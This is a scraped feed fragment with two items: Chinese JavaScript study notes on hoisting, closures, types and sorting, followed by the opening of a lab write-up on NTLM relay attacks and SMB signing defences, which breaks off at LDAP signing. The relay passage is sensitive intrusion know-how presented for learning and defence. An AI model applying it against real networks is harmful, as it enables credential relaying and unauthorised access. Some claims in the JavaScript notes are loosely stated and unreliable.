console.log(a)
var a = 1
}
fn()
//输出结果为undefined
例：注意：下面的程序中函数内部的变量声明提前的问题 ×
var a = 5;//声明并赋值全局变量a
function fn() {
//变量声明提前 var a
a = 8;//由于变量声明提前了，这里修改的a是局部变量a，局部变量a修改为8
var a = 10;//变量声明提前至函数内的最顶部，//再次修改局部变量a 的值为10
console.log(a)//这里输出的是局部变量a 的值10
}
fn();
console.log(a)//这里输出的是全局变量a的值，在函数内部由于变量声明提升，全局变量a根本就没有被修改过，全局变量a值还是为5
//输出结果为 10 5
例：变量声明提前+未声明的变量js自动声明为全局变量 √
//变量声明提前var a
function fn() {
console.log(a)//函数内部没有局部变量，访问的是全局变量a，在这时全局变量a的值为5，还未执行到a=8的时候
a = 8;//变量未声明，js自动帮忙声明为全局变量，因此在函数内部没有局部变量。
//执行a=8将全局变量a的值改为8
}
var a = 5;//全局变量a声明提前,先给全局变量a赋值为5在调用函数
fn();
console.log(a);//在函数内部将全局变量a 的值修改为了8，输出为8
//结果：5 8
例：函数的执行顺序+变量声明提前+未声明的变量js自动声明为全局变量+声明了但尚未赋值的变量输出的结果为undefined √
// var a   js自动声明为全局变量
a = 3;//全局变量，js自动声明为全局变量
function fn() {
//var a
console.log(a)//输出的是局部变量a，但是局部变量a只是声明了未赋值，结果为undefined
a = 5;
var a;//声明提前，局部变量a
console.log(a)//输出的是局部变量a
}
console.log(a)
fn();
//结果：3 undefined 5
例子：变量声明提前+(a++)与(++a)区别+全局变量与局部变量 √
// var a;  变量声明提前
a = 8;//全局变量a=8
function fn() {
//var a;  局部变量声明提前
a = 1;//局部变量a=1
var a = 12;//局部变量声明提前.  //局部变量a=12
console.log(a++);//输出局部变量a=12，后a+1局部变量变为a=13
}
var a;//全局变量声明提前
console.log(a++);//输出全局变量a=8，后a+1变为全局变量a=9
fn();
//结果：8 12
例子：调用两个函数+局部变量与全局变量+未声明的变量js自动声明为全局变量 √
//var a; js帮忙声明为全局变量，既是函数外的a自动声明，又是函数fn内的a自动声明
a = 5;//变量未声明，js自动帮忙声明为全局变量，全局变量a=5
function fn() {
console.log(a)//输出为全局变量a=5,在该函数内没有局部变量a，访问的是全局变量a
a = 12;//变量未声明，js自动帮忙声明为全局变量，//将全局变量值改为a=12
}
function fn2() {
//var a;  局部变量声明提前
a = 4;//局部变量a=4
console.log(a);//输出局部变量a=4
var a = 8;//局部变量声明提前.//将局部变量a修改为a=8
}
fn();//使用的是全局变量a
fn2();//使用的是局部变量a
console.log(a)//输出全局变量a=12,在fn()函数中的a为全局变量，修改过全局变量a的值
//结果：5 4 12
8.等号左边⼀定是变量，等号右边⼀定是数据或者表达式(结果是个数据)
5.控制台
是⼀个可以输出js代码的地⽅
作⽤：1.⽤来调试的 2.提示错误 3.扯淡
控制台不报错不代表没有错，控制台报错了不⼀定代表是所标注的错误，但是⼀定代表有错
console.log(要输出的数据)：在控制台中输出数据
alert()
作⽤：调试的 提示/警告 会中断程序运⾏，直到将弹窗关闭之后后面的语句才会继续执行 以弹窗的形式出现
console.error(要输出的数据)：以错误数据的形式在控制台上显示
6.数据类型
原始数据类型
1.number(数字类型)
2.string(字符串) 字符或者字符与其他数据的组合
字符串⼀定要加引号，加引号的数据⼀定是字符串
如果引号嵌套的情况，双引号⾥⾯可以放单引号，单引号⾥⾯不允许放双引号
变量名不能加引号
3.boolean(布尔类型) true false
4.undefined(未定义) ⽤来⾃动初始化变量的
5.null（空指针,也是对象的一种） ⽤来主动释放对象的，像全局变量需要手动释放 空地址，没有引用的内容
var a=[1,2,3,4];a=null; 并不是把数据删掉了，只是将栈中的指针设为null，让指针没有指向的数据，切断了栈和堆之间的联系，这样在堆中的数据才会被垃圾回收机制回收。
引用数据类型
array(数组)
//function (函数)
object(对象) 函数function和数组array也是对象
js中一切皆对象，数组和函数是对象的一种，null也是属于object
两种数据类型的区别
主要差别在于存储位置不同，虽然都在内存中，但是也是有差别的
原始数据类型：数据存在变量本地 栈
引⽤数据类型：数据不存在变量本地 堆。也会在栈中开辟空间，里面存的是指针，即数据在堆中
的地址
栈 / 堆：本质上是内存中的⼀块存储空间
每次只要声明一个变量，就在栈中开辟一块空间放入数据，当数据为原始数据类型时直接将数据存入栈中即可；如果数据为引用数据类型的，这时在栈中仍然会开辟一块空间，但这是发现空间不够放入数据，这时将数据存入堆中，此时栈中给引用数据类型的变量开辟的空间仍然存在，里面存入的是数据在堆中的存放的地址即指针，之后每次要访问该引用数据类型的数据时，先在栈中找，然后根据栈中的指针的地址在堆中找到相应的数据。如：
var a=1;//number，原始数据类型，数据存放在栈中
var b="hello"//string ,原始数据类型，数据存放在栈中
var c=true//boolean 原始数据类型，数据存放在栈中
var arr=[1,2,3,4]//array  引用数据类型，数据存放在堆中，栈中存的是指针，即数据在堆中的地址
var d = null//地址就是null，但是在堆中没有引用内容
//其数据类型为object对象
注意：变量复制的时候、变量比较({}==={} false)的时候需要格外注意，引用数据类型操作的都是指针，而不是数据本身。
7.运算符
表达式：由运算符连接的，最终运算结果是⼀个值的式⼦
表达式跟值是等效的
程序模拟⼈类进⾏计算的符号
（1）算术运算符：+ - * / % ++ -- 仅适⽤于number类型的数据
次方：基数**指数或Math.pow(基数,指数)(10**3或Math.pow(10,3)=1000)(与之前学习的不同的是，在js中^表示的是异或，不是次方)
关于++，如果单独使⽤，放前放后都可以
如果不是单独使⽤，后++，先⽤旧值参与表达式，表达式结束之后再+1
前++，先+1，再参与表达式
（2）关系运算符: &gt; &lt; &gt;= &lt;= ==(不严格判相等) ===(严格判相等) != (不严格判不相等) !== (严格判不相等) 仅适⽤于number类型的数据(将那些不是number类型的数据转换为number类型的数据) 其结果是布尔类型的true或false 不允许连着写
==：不严格的判断是否相等，允许发生类型转换。如a=true;b=1;结果为true。如a=5;b=”5”;结果为true.
===：严格的判断是否相等，不允许发发生类型转换，必须一模一样
布尔与数字的运算时：true会自动转换为1，false会自动转换为0.
（3）逻辑运算符：与（&amp;&amp;） 或（|| ） ⾮ （！） &amp;&amp;和||同时出现的话，先计算 &amp;&amp; ，再计算 ||
如果使用 &amp;&amp; 或 || 的时候两边跟的不是条件判断而是一个普通的值时，返回的也是一个普通的值。因此，逻辑运算符返回的不一定都是布尔值，要看两边的实际内容。
&amp;&amp;和||具有短路性：后面的有些运算可能压根就不执行。
如：
var a = 5;
var b = 0;
var c = 7;
console.log(b &amp;&amp; a++);
console.log(a);  //a输出的结果为5，因为&amp;&amp;前面的b为false，无论后面的值为什么结果都是b的内容，所以后面的a++压根不用执行，因此a的值还是5
关于逻辑运算的返回值：
只要“||”前⾯为false或者转换为布尔值是false，⽆论“||”后⾯是true还是false还是普遍的数字值，结果都返回“||”后⾯的值。
只要“||”前⾯为true或者转换为布尔值为true，⽆论“||”后⾯是true还是false还是普遍的数字值，结果都返回“||”前⾯的值。
只要“&amp;&amp;”前⾯是false或者转换为布尔值是false，⽆论“&amp;&amp;”后⾯是true还是false，结果都将返“&amp;&amp;”前⾯的值;
只要“&amp;&amp;”前⾯是true或者转换为布尔值是true，⽆论“&amp;&amp;”后⾯是true还是false还是普通的数字值，结果都将返“&amp;&amp;”后⾯的值;
需要说明的是“&amp;&amp;”的优先级是⾼于“||”的，下⾯测试：
1 console.log(1||'a'&amp;&amp;2); //这段代码返回的是1
（4）赋值运算符：= += -= *= /= %=
（5）字符串连接运算符：+ 任何数据(包括布尔类型的ture和false)与字符串拼接，结果都是字符串
（6）三⽬(元)运算符： 条件(结果为true或false的结果) ? 条件成⽴时候的值/表达式 : 条件不成⽴时候的值/表达式
//使用三元运算符 计算三个中或者更多的最大值；先比较a&gt;b?，若成立再比较a&gt;c?若不成立则比较b&gt;c?
var a = 555;
var b = 256;
var c = 10;
var d = a &gt; b ? (a &gt; c ? a : c) : (b &gt; c ? b : c)
console.log(d)
typeof():⽤来检测数据类型，是一个函数 console.log(typeof(a));
typeof的返回值是有固定的值的：number、string、boolean、undefined、object、function、symbol。
使用 typeof 无法区分array 和 object ，但是可以区分 function.
如：
//typeof的返回值类型
var a = 12
var b = "hello"
var c = true
var d = null
var e
var f = [1, 2, 3, 4]
var g = { name: "Lily", age: 18 }
function fn() {}
console.log(typeof (a))//number
console.log(typeof (b))//string
console.log(typeof (c))//boolean
console.log(typeof (d))//null-&gt;object
console.log(typeof (e))//undefined
console.log(typeof (f))//array-&gt;object
console.log(typeof (g))//object-&gt;object
//无法用typeof区分array和object,但可以区分函数function
console.log(typeof (fn))//function
8.语句
if else 可以进⾏多重条件判断
if (条件1) {
满足条件时执行的语句
}
else if (条件2) {
满足条件时执行的语句
}
else if (条件3) {
满足条件时执行的语句
}
else {
不满足条件时执行的语句
}
以下六种情况都算false ，其他的都是true
①false ②0 ③undefined ④null ⑤"" ⑥NaN(not a number，通常出现在对非数字的进行数字运算而无法算出结果的时候，结果就是NaN)。
空数组[]和空对象{}是true
9.类型转换
显示类型转换
我们主动更改数据类型
toString()其他类型的转为字符串；Number()将字符串类型的数字转为数字类型的数字；
parseInt() parseFloat()将以数字开头的字符串转为数字；
split()将字符串切割转换为数组；join()将数组拼接转换为字符串；
JSON.parse()将字符串转换为对象；JSON.stringfy()将对象转换为字符串；
隐式类型转换
自动发生的，程序自动进行的，方便运算
js中的数据会根据具体情况⾃动改变数据的类型。
布尔与数字的运算时：true会自动转换为1，false会自动转换为0.
字符串与其他类型的拼接时：其他的数据类型都会发生隐式类型转换，转换为字符串类型。
字符串比较大小：使用编码法则转为数字
字符串与布尔类型的关系运算：全部转换为number类型，true为1,false为0,其他的字符按照编码转。
判断真假(是否成立,逻辑运算符)：转换为布尔值。数字0会转为false，其他的数(包括小数和负数)都转换为true；字符串中只有空字符””转为false，其他的都转为true. undefined算false
10.函数/方法及其例题
（1）什么情况下⽤函数：如果⼀段代码要反复调⽤，那么就考虑封装成函数了。
函数：封装⼀段执⾏专⻔任务的代码段。
函数是不调⽤不执⾏的
（2）函数声明方法1：function 函数名(形参){
代码段//想⼲的事
}
函数声明方法2(声明变量的方式声明函数)：var 函数名=function(参数){代码段} （等号右边的函数也是数据，函数本质上就是一个值，它的数据类型是对象） 要注意声明和调用的顺序，先声明，后调用
这两种函数声明的方法实现的效果是一样的，但是在函数提升上是不一样的。按照函数方式声明时可以将函数整体提前；而按照变量的方式声明的函数只是将函数声明提前了，函数的整体并没有提前。因此在使用以函数方式声明的方法时声明与调用的顺序都可以，而使用以变量方式声明的方法时一定要先声明后调用，否则会出现函数提升的错误。
例子：函数声明方法2 中的函数提升的对比：
// 使用声明变量的方式声明函数，这种是正确的
var fn = function () {
console.log(223)
}
fn()
//var fn;  结果是错误的，只是将函数的声明提前了，整体未提前
fn()//按照变量声明提前的规则，只是将函数声明提前了，函数整体并没有提前，结果出现错误
var fn = function () {
console.log(223)
}
（3）函数名与变量名不能重名，因为函数的第二种声明方式是按照变量的方式声明的，函数本质上是一个值，将fn声明为了函数，又将fn声明为变量，由于变量声明比函数声明更优先，在这时如果调用函数会出现fn不是函数的错误，但是如果是使用变量fn则可以正常使用。
//函数名与变量名同名问题：由于变量声明比函数声明更优先，有了变量声明之后，函数的声明就失效了。
//函数声明
function fn() {
console.log(125)
}
//变量声明
var fn = 5
// fn();   //调用失败，出现fn不是函数的错误
console.log(++fn)//正常使用变量fn，结果为6
（4）函数的调⽤:函数名(实参)
参数：函数内独有的变量，接受函数外的数据，在函数内部处理，参数可以让⽅法更灵活
形参：形式上的参数，方法定义时的参数
实参：实际上的参数，方法调用时的参数
参数不限制数量，不限制数据类型，多个参数之间以逗号隔开就⾏
（5）函数提升：整体提前到当前作用域的最顶部
（6）return关键字：
函数是⼀个纯过程，没有任何结果。如果函数的执⾏你需要⼀个结果，可以加return关键字
return 你想要的值 函数的结果就是return后⾯的表达式
return的本意其实是退出函数的运⾏，如果return后⾯有值的话，那么会在退出的同时，返回⼀个结果
（7）js中函数的参数传递方式为：按值传递。
按引用传递：
如：
function fn(a) {
a = 5;
}
var m = 10
fn(m)
console.log(m)//输出结果：10
//js中的函数传递为按值传递，传进去的m在函数内的操作修改，不影响函数外的值
如：
var arr = [1, 2, 3, 4]
function fn(a) {
a[0] = 5
}
fn(arr)
console.log(arr)//输出结果：[5,2,3,4]
//因为变量传进去的是指针，指向同一块数据，只要做了修改都会受到影响
11.作用域scope
⼀个变量可⽤的范围
全局作⽤域：函数外，全局不能访问局部的数据
局部作⽤域：函数内, 局部内可以访问全局的数据
函数调⽤的时候才创建，调⽤结束之后⽴即销毁
局部内要更改某个数据，优先⽤局部内的，局部内没有会往外层找
全局变量：在全局作⽤域内/函数外声明(不是使用)的变量叫全局变量。
局部变量：在局部作⽤域内/函数内声明(不是使用)的变量叫局部变量。
作用域链：对于嵌套的函数，内层的函数中的变量从内层一层一层的向外层找相同的变量，直到找到了或者找到全局变量为止。
即函数在执行的过程中，先从自己内部寻找变量，如果找不到，再从创建当前函数所在的作用域去找，从此往上，也就是向上一级找，直到找到全局作用域还是没找到。
作用域链的本质是底层的
变量查找机制
。
12.JS垃圾回收机制
垃圾回收机制简称GC。
JS中内存的分配和回收都是自动完成的，内存在不使用的时候会被垃圾回收器自动回收。
内存的生命周期
JS环境中分配的内存,一般有如下生命周期：
1.内存分配：当我们声明变量、函数、对象的时候，系统会自动为他们分配内存。
2.内存使用：即读写内存，也就是使用变量、函数等。
3.内存回收：使用完毕，由垃圾回收自动回收不再使用的内存
4.说明： 全局变量一般不会回收(关闭页面才会回收)；
一般情况下局部变量的值,不用了,会被自动回收掉
内存泄漏
程序中分配的内存由于某种原因程序未释放或者无法释放，叫做内存泄漏。
垃圾回收机制的算法说明
堆栈空间分配区别：
1.栈（操作系统）:由操作系统自动分配释放函数的参数值、局部变量等，基本数据类型放到栈里面。
2.堆（操作系统）:一般由程序员分配释放，若程序员不释放，由垃圾回收机制回收。复杂数据类型放到堆里面。
下面介绍两种常见的浏览器垃圾回收算法:引用计数法和标记清除法
引用计数法
IE采用的引用计数算法,定义“内存不再使用”，就是看一个对象是否有指向它的引用，没有引用了就回收对象。
算法：
1.跟踪记录被引用的次数
2.如果被引用了一次，那么就记录次数1,多次引用会累加++
3.如果减少一个引用就减1--
4.如果引用次数是0，则释放内存。
首先声明变量person，系统自动分配内存空间，该数据是一个引用类型的数据，将对象数据存储在堆中，在栈中存储的是数据在堆中的地址即指针。此时该对象数据被引用次数+1，变为了1次。
然后，声明变量p，分配内存空间，把person存储的指针赋值给p，person和p都指向堆中的同一块数据。此时，该对象数据被引用次数+1，变为了2次。
然后，把person的值变为1，为原始数据类型，直接把数据存储在栈中。此时person不再指向堆中的对象。此时，该对象数据被引用次数-1，变为了1.
最后，把p值变为nul，为原始数据类型直接存储在栈中，此时p也不再指向堆中的对象。此时，该对象数据被引用次数-1，变为了0。
在这时，引用次数变为了0，该对象被垃圾回收器回收。
缺点：
但它却存在一个致命的问题：嵌套引用（循环引用）如果两个对象相互引用，尽管他们已不再使用，垃圾回收器不会进行回收，导致内存泄露。
因为他们的引用次数永远不会是0。这样的相互引用如果说很大量的存在就会导致大量的内存泄露。
标记清除法
现代的浏览器已经不再使用引用计数算法了。现代浏览器通用的大多是基于标记清除算法的某些改进算法，总体思想都是一致的。
核心：
1.标记清除算法将“不再使用的对象”定义为“无法达到的对象”。
2.就是从根部（在JS中就是全局对象）出发定时扫描内存中的对象。凡是能从根部到达的对象，都是还需要使用的。
3.那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收。
13.闭包（面试重点）⭐⭐⭐⭐⭐
概念：内部函数使⽤了外部函数的局部变量，这种结构叫闭包（函数套函数）
作⽤：保护变量的/避免全局污染(变量放在全局被不小心篡改)
性能问题/弊端：内存泄漏 /内存溢出 因为闭包中的局部变量⼀直被全局变量使⽤着，而全局变量无法被垃圾回收机制清除，导致该局部作⽤域也无法被垃圾回收机制回收，内存释放不掉，依此导致的内存泄露问题。
垃圾回收机制：自动回收垃圾(不用了的变量，调用结束了的局部变量)。
全局变量永远不会被回收，占内存。
函数作用域在调用的时候才会创建，在调用结束之后立即就会销毁。函数占用的内存很少，全局变量才会占用大量的内存。
将变量声明和使用放在函数内部，这时会出现每次调用该函数时变量会被重新赋值，之前对变量的操作无法进行保存，
如果只想多次执行函数内的一部分，而另一部分不想多次执行，这时可以将不想多次执行的语句放在外面的函数里，想要多次执行的语句再放进一个函数里进行函数嵌套使用，调用的时候调用里面嵌套的函数。使用的时候外部函数中的局部变量的值会得到保存，而内部函数中局部变量的值每次都得到刷新。
产生问题：调用嵌套的函数属于局部的，无法直接进行调用。解决：在函数内return fn2;这样虽然无法将局部变为全局，但是可以在全局中就可以拿到局部的数据了。
function fn() {
var n = 0;//将n声明为局部变量
// function fn2() {
//     return n++;
// }
// //fn2函数相当于var fn2=function(){return n++;}
// return fn2;
//上面的内容等价于：直接返回值是一个函数,就不用fn2这个临时的变量去存储了直接使用
return function () { return n++; }
//  在外面全局想要拿到局部变量，可以使用return拿到局部变量到全局中使用
}
var c = fn();//fn()返回的是函数fn2,相当于var c=function(){return n++;}
//相当于var c=function(){return n++:}
//相当于function c(){return n++;}
//这时计数器就变成了c()
console.log(c());
//等价于
//console.log(fn()());
//因为执行fn()返回的是一个函数，在调用的时候按照函数的形式调用，fn()()返回的才是一个值。
//但这时会出现结果错误，因为每次都在调用完fn()函数之后，产生的局部变量就会别自动回收，下次再次调用的时候会重新创建作用域
//为什么给fn()赋给了c之后就不会回收，因为c是全局变量，全局变量永远不会被自动回收。核心是被全局变量使用了，内存释放不掉
console.log(c());
console.log(c());
console.log(c());
n = 152;//这时再在全局修改n的值就不会产生影响了
console.log(c());
console.log(c());
console.log(c());
调用几次函数就需要有几个标记变量，想要用这个变量又不能把他放在局部变量，放全局变量的话又封装不彻底数据污染导致调用几次函数就得要声明几个变量，在这时就可以使用闭包来使用这个标记变量。
目前使用到了闭包的场景：DOM实战2注册界面的眼睛、定时器防抖函数和节流函数都用到了闭包。
//使用闭包实现的眼睛，这样就不用再使用了两个flag了
images[0].onclick = eyesSwitch(0)
images[1].onclick = eyesSwitch(1)
function eyesSwitch(index) {
var flag = true
return function () {
if (flag) {
images[index].src = "images/open.png"
inputs[index + 1].type = "text"
} else {
images[index].src = "images/close.png"
inputs[index + 1].type = "password"
}
flag = !flag
}
}
描述闭包导致的内存泄漏问题的原因。
由于闭包中的局部变量始终被全局变量使用着，而全局变量是不能销毁的（不能被垃圾回收机制清除），导致闭包内的局部作用域也无法被垃圾回收机制回收，使得内存无法得到释放，从而导致内存泄露问题。
关键点是函数fn在全局c中被调用了，把返回的函数结果给到了全局变量，而全局变量不能被销毁，导致fn无法被释放.
//不会导致内存泄漏问题的情况
function fn() {
let n = 0;
return function () {
return n++
}
}
console.log(fn()())//0
console.log(fn()())//0
console.log(fn()())//0
console.log(fn()())//0
//这种情况下没有导致闭包，是因为局部变量fn调用结束之后就被销毁了
//会导致内存泄漏的情况
function fn() {
let n = 0;
return function () {
return n++
}
}
let c = fn();//这一步是闭包的关键点，函数fn被全局变量c一直使用着，而全局变量是不能被销毁的，导致局部变量fn也不能被销毁，内存无法得到释放
console.log(c())//0
console.log(c())//1
console.log(c())//2
console.log(c())//3
闭包一定有return 吗？不
什么时候使用return ? 当函数外想要使用闭包内的变量时加return
闭包可以实现数据的私有，外面的可以使用这个变量，但是外面是无法进行修改的
闭包一定会导致内存泄漏吗？不
不是所有的内存泄漏都要手动回收的。
比如react里面很多闭包是不能回收的
函数的作用：避免变量全局污染；使数据私有化，外部无法修改内部数据；可以让外部可以使用内部的私有数据。
闭包的核心作用：使变量可以驻留在内存，不被回收。
闭包的作用：封闭数据，提供操作，外部也可以访问函数内部的变量
14.循环语句
(1)循环：程序反复执⾏⼀套相同的代码
(2)循环三要素：
1.循环变量:循环中做判断的量 循环变量⼀定是向着循环退出的趋势去变化
2.循环条件：保证循环继续运⾏的条件
3.循环体：循环中每次要做的事
(3)while循环
while(循环条件){要做的事}
for循环 for in 循环也适用于数组(但是其角标)输出的是字符串类型的)
⽤途：⽤作数组遍历
for(var i=0;i&lt;10;i++){要做的事} 在这时的i还是全局变量
(4)break：结束当前循环
continue：直接跳过该轮循环，不再继续向下运行，直接进行下一轮循环
15.数组
数组：批量存储多个同类型数据的，多个数据以逗号隔开，数组是没有任何数据类型限制的也没有任何数量限制的。
var arr=[1,2,3,4,5,6];
数组其实就相当于多个变量的集合。
数组的访问：数组名[⻆标]
数组的更改 ：数组名[⻆标]=新值
数组的属性：length 直接返回数组的⻓度
在数组中做判断条件时要将时同一类型的放在else中，不是同一类型的不要放在else中。
另外，在用if判断时不要一开始就做比较判断，先做其他类型的判断，因为不是数字类型的数据也是可以做比较大小的，如number 和string类型的。
浅拷贝/浅复制⭐⭐⭐
对于引用数据类型的数据进行复制赋值时，给的都是指针，而不是直接给数据。使得他们都拥有相同的指针，指向相同的数据，这时修改其中一个中的数据，另一个的内容也是会受到影响的。这种情况就是浅拷贝。浅拷贝复制的是指针，不是数据
var a = [1, 2, 3, 4, 5]
var b = a; //复制的是指针，不是数据
b[0] = 100;
console.log(a)//结果为：[100,2,3,4,5]
console.log(b)//结果为：[100,2,3,4,5]
//数组a和数组b的输出内容一样，因为var b=a是将a的指针赋值给b，这时a和b有着相同的指针地址，他们指着堆中相同的数据，这时修改b中的数据,a中的数据也是会受到影响的。
//对于引用数据类型的数据进行复制赋值时，给的都是指针，而不是直接给数据
字符串VS数组VS对象
字符串和数组相同点：都可以通过角标访问；都具有length长度属性；
数组：可以更改内容；
字符串：不能更改内容；
数组和对象相同点：都是用来存储多个数据的；内容都是可更改的；
数组：用来存储同类型的数据 (虽然可以存储不同类型的数据，但不这么用);
对象：用多个数据共同描述一个事物；
如：
如： var str = "hello"
str = "hi"//这不是更改字符串的内容，这是将原来的字符串的内容丢掉重新赋值的
console.log(str)//输出结果是hi
var str = "hello"
console.log(str[1])//输出为e,通过角标访问的是字符串中的某个字符
var str = "hello"
str[1] = "i"//更改字符串
console.log(str)//输出为hello，字符串未更改成功
//因此，字符串的内容是是无法像数组一样进行更改的
console.log(str.length)//结果为5，输出字符串的长度
二维数组
var arr=[[1,2,3],[4,5,6]] 访问时arr[1][0]结果为4，数组arr的长度为2
16.冒泡排序算法（小 -&gt; 大）
n个数据，第0轮比较n-1次，第1轮比较n-1-1次，第2轮，比较n-1-2次，...，第n-2轮比较n-1-(n-2)=1次
每轮拿第0项和第1项比较，第0项&gt;第1项则交换顺序，否则不动；
拿第1项和第2项做比较，第1项&gt;第2项则交换顺序，否则不动；
依次类推，比较n-1次，最后得到：最后一个值是该轮中最大的数。
从头再来一次，比较n-2次：每次拿第0项和第1项做比较......
/* 冒泡排序 从小到小 n个数据*/
/*每次拿第0项和第1项比较，第0项&gt;第1项则交换顺序，否则不动；
拿第1项和第2项做比较，第1项&gt;第2项则交换顺序，否则不动；
一次类推，比较n-1次，最后得到：最后一个值是该轮中最大的数。
从头再来一次，比较n-2次：每次拿第0项和第1项做比较......*/
/*性能优化：
1 在一轮比较中，n个数据需要比较n-1次找到该轮中最大的值
2 共n个数据，需要比较n-1轮，就可以找到所有数据的顺序，最后一个是数据根本不用比较一定是最小的数据
3 每轮得到最后一个该轮最大的数在之后的每轮比较中是不用再参与比较的，因为他们一定是剩下的数中最大的数*/
/* 即 n个数据，第0轮比较n-1次，第1轮比较n-1-1次，第2轮，比较n-1-2次，...，第n-2轮比较n-1-(n-2)=1次 */
var a = [12, 9, 123, 96, 8, 6, 56, 47, 33]
var n
for (var i = 0; i &lt; a.length - 1; i++) {
for (var j = 0; j &lt; a.length - 1 - i; j++) {
if (a[j] &gt; a[j + 1]) {
n = a[j]
a[j] = a[j + 1]
a[j + 1] = n
}
console.log("执行了一次")
}
}
console.log(a)</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540144.html</guid><pubDate>Fri, 31 Oct 2025 07:25:54 +0000</pubDate></item><item><title>一文详解Ntlm Relay</title><link>https://www.ppmy.cn/news/1540145.html</link><description>Ntlm Rleay简介
Ntlm Rleay翻译过来就是Ntlm 中继的意思，也肯定是跟Ntlm协议是相关的，既然要中继，那么攻击者扮演的就是一个中间人的角色，类似于ARP欺骗，ARP欺骗就是在一个广播域中发送一些广播，然后大声问这个IP地址的MAC地址是多少啊？？？如果有不怀好意的人回答了，那么就造成了ARP欺骗，好似一个中间人攻击。
就比如说有一个客户端和一个服务端，客户端请求服务端的某个服务，需要身份验证，客户端提供身份验证，服务端响应，这原本是一次很正常的流程，但是如果加入了攻击者这个角色，那么就变成了攻击者发送同样的消息给服务端，服务端进行响应，然后交给攻击者，攻击者返还给客户端。
那么我们可以想象其实攻击者就是充当了一个代理转发点。
看一下如下图:
攻击者在客户端和服务端的中间，也就是说你客户端发送的无论是质询，响应，认证，我攻击者都是可以收到的，为什么会收到？，因为客户端以为攻击者是服务端，而正好相反，服务端以为攻击者是客户端，这就造成了，客户端将数据给攻击者，攻击者再将数据发送给服务端，同样服务端返回数据给攻击者，攻击者也返回数据给客户端，那么这中间如果攻击者对数据进行了修改，或者说发送给其他人了，并没有发送给原来的客户端，那么就可能造成了安全问题。
Ntlm Relay测试分析
这里的测试环境:
域:relaysec.com
user-win7 10.211.1.2
dc 10.211.1.210
kali 10.211.1.45
这里我们使用ntlmrelay.py
ntlmrelay.py可以将获取到Ntlm中继到内网的其他机器。
这里表示的意思就是，如果我获取到了其他机器的SMB凭据，我中继给1.2这台机器。
紧接着我们到DC上面去请求一下攻击者这台机器。
去dir \10.211.1.45\addwadwa 只需要访问到攻击者的SMB服务即可。
我们这里wireshark抓包，我们需要着重注意红框中的6个包。
他们分别代表着 协商，质询，认证。
我们先来简单看一下这个包，会发现其实攻击者一直在做一个转发的事情，攻击者就是一个代理转发点，一直转发着客户端和服务端的数据。
我们先来看第二组包，也就是DC给攻击者发送质询包的时候。
我们直接来看质询值，会发现客户端发送给攻击者的质询值和攻击者发送给DC的质询值是没有改变的。这两个包其实是一样的。
也就是说当攻击者收到这个请求的时候，他会原封不动的将包发送给210。
我们可以看到攻击者只是在转发东西，它只是将信息从客户端传递到服务端，只是最后服务端以为攻击者身份验证成功，所以攻击者可以代表DC去WIN7这台机器上操作。
这里中间还有SSPI和NTLM SSP这里当作了解即可，可以看之前的NTLM协议那篇文章。
会话签名
签名其实就是一个校验数据在发送期间有没有被更改的方法，比如说张三给李四发送了一个hello world的文档，并且对这个文档进行了数字签名，
那么任何收到该文档并且和他签名(张三)的人都可以验证编辑它的人是张三
，并且可以确定他写了这句话。因为签名保证文档没有被修改，只要协议支持，签名原则可以应用于任何协议，例如SMB协议，Ldap协议，HTTP等等，但是在实际情况中，HTTP前面很少实现。
签名的意义就是当客户端想要访问服务的时候，由于攻击者可以处在中间人的位置并且中继身份信息，因此他可以在于服务器交互的时候冒充客户端。这就是签名发挥作用的时候。
在Ntlm中继中，攻击者想要伪造客户端，但是他不知道的客户端的密钥，因此他就无法替客户端做任何事情。由于攻击者无法对任何数据包进行签名，因此接收到数据包的服务端查看有没有签名或者说这个签名对不对，如果不对或者没有签名的话，服务端直接拒绝攻击者的请求。
所以说数据包必须在认证后进行签名，那么攻击者就攻击不了了，因为他不知道客户端的密钥。
认证之后代表的是这个包： 协商-&gt;质询-&gt;认证
但是客户端和服务端如何才能达成一致的呢，就比如说我客户端想要签名，你服务端不知道我客户端想要签名，所以服务端如果不签名的话，又是什么情况呢？
所以来到了NTLM的协商阶段，也就是协商包呗。
NTLM 协商
这个协商包，我们之前已经再NTLM协议中了解过了这里直接来看他的标志位。
这里的有很多的协商标记，这里我在Ntlm协议哪里已经详细解释过了，我们这里主要看
NEGOTIATE SIGN
这个协商标记设置的是1，他表示客户端支持签名，但是这并不代表服务端一定会签署客户端的数据包，只是客户端有这个能力。
同样当服务端回复的时候，如果支持签名的话，这个标记位也是1。
所以说，这种协商只是客户端向服务端表示我支持签名，同样服务端向客户端表示我支持签名，但是这并不意味着数据包就会被签名，就比如说HTTP协议，即使客户端和服务端都支持签名，其实实际上也会很少签名。
微软提供了标记位，用于确定SMB数据包是否基于客户端和服务端的设置来进行签名，而对于SMBV2的版本是必须处理签名的。
我们可以在HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters注册表中更改EnableSecuritySignature键和RequireSecuritySignature键，这两个的值需要改成1。
注意:这里你不能只更改一台机器为SMBV2，否则还是不签名。
win7:
DC:
紧接着我们使用ntlmrelay.py工具进行攻击。
可以发现已经明显不行了。
我们来抓包看下:
首先这里我们不用kali来去做这个中继，我们直接访问1.2
然后进行抓包。
主要查看这两个包。
可以看到10.211.1.210去访问10.211.1.2的时候，签名状态。
这两个值其实就是我们上面在注册表中设置的值，我这里给10.211.1.210设置为了EnableSecuritySignature为1，RequireSecuritySignature为0。EnableSecuritySignature设置为1表示10.211.1.210支持签名，RequireSecuritySignature设置为0表示我不用签名。说的简单点就是虽然我支持签名，但是协商不签名。但是如果服务端需要签名的话，服务端可以处理我的签名。
我们再来看服务端也就是10.211.1.2。
这里它表示我不仅支持签名，我还需要签名。
那么在协商阶段的时候，客户端和服务端将NEGOTIATE_SIGN标志设置为1，因为他们都支持签名。完成身份验证之后，会话继续。
那么我们来测试一下，如果客户端没有设置签名，但是服务端设置了签名并且要求签名，能不能中继成功？(如下测试是对于SMBV1的)
显然是不行的。
那么如果服务单没有设置签名，客户端设置了签名，能不能中继成功？
我们发现是可以的。
wireshark如下抓包:
那么如果服务端支持签名，但是不需要签名，我们发现还是可以中继成功的。
那么也就是说服务端需要既支持签名又需要签名，客户端无论需不需要，都要签名。
如上的测试只需要改注册表的值即可，就是RequireSecuritySignature和EnableSecuritySignature这两个值改为0或1。
Ldap签名
Ldap签名有3个级别。
禁用: 这意味着不支持数据包签名。
